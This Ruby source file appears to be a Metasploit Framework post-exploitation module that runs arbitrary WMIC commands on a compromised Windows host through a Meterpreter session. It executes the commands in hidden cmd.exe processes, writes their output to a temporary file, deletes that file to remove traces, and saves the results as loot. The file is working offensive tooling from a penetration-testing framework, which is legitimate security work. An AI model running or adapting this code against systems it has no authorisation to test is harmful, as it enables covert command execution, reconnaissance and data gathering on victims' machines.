##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'

class Metasploit3 < Msf::Post

  include Msf::Post::Common

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Gather Run Specified WMIC Command',
      'Description'   => %q{ This module will execute a given WMIC command options or read
        WMIC commands options from a resource file and execute the commands in the
        specified Meterpreter session.},
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptPath.new('RESOURCE', [false, 'Full path to resource file to read commands from.']),
        OptString.new('COMMAND', [false, 'WMIC command options.']),
      ], self.class)
  end

  # Run Method for when run command is issued
  def run
    tmpout = ""
    print_status("Running module against #{sysinfo['Computer']}")
    if datastore['RESOURCE']

      if ::File.exists?(datastore['RESOURCE'])

        ::File.open(datastore['RESOURCE'], "br").each_line do |cmd|

          next if cmd.strip.length < 1
          next if cmd[0,1] == "#"
          print_status "Running command #{cmd.chomp}"

          wmicexec(cmd.chomp)

        end
      else
        raise "Resource File does not exists!"
      end

    elsif datastore['COMMAND']

      cmd = datastore['COMMAND']
      wmicexec(cmd)

    end
  end

  def wmicexec(wmiccmd)
    tmpout = ''
    session.response_timeout=120
    begin
      tmp = session.fs.file.expand_path("%TEMP%")
      wmicfl = tmp + "\\"+ sprintf("%.5d",rand(100000))
      print_status "running command wmic #{wmiccmd}"
      r = session.sys.process.execute("cmd.exe /c %SYSTEMROOT%\\system32\\wbem\\wmic.exe /append:#{wmicfl} #{wmiccmd}", nil, {'Hidden' => true})
      sleep(2)
      #Making sure that wmic finishes before executing next wmic command
      prog2check = "wmic.exe"
      found = 0
      while found == 0
        session.sys.process.get_processes().each do |x|
          found =1
          if prog2check == (x['name'].downcase)
            sleep(0.5)
            found = 0
          end
        end
      end
      r.close

      # Read the output file of the wmic commands
      wmioutfile = session.fs.file.new(wmicfl, "rb")
      until wmioutfile.eof?
        tmpout << wmioutfile.read
      end
      wmioutfile.close
    rescue ::Exception => e
      print_status("Error running WMIC commands: #{e.class} #{e}")
    end
    # We delete the file with the wmic command output.
    c = session.sys.process.execute("cmd.exe /c del #{wmicfl}", nil, {'Hidden' => true})
    c.close
    vprint_status tmpout
    command_log = store_loot("host.command.wmic", "text/plain", session,tmpout ,
      "#{wmiccmd.gsub(/\.|\/|\s/,"_")}.txt", "Command Output \'wmic #{wmiccmd.chomp}\'")
    print_status("Command output saved to: #{command_log}")
  end
end
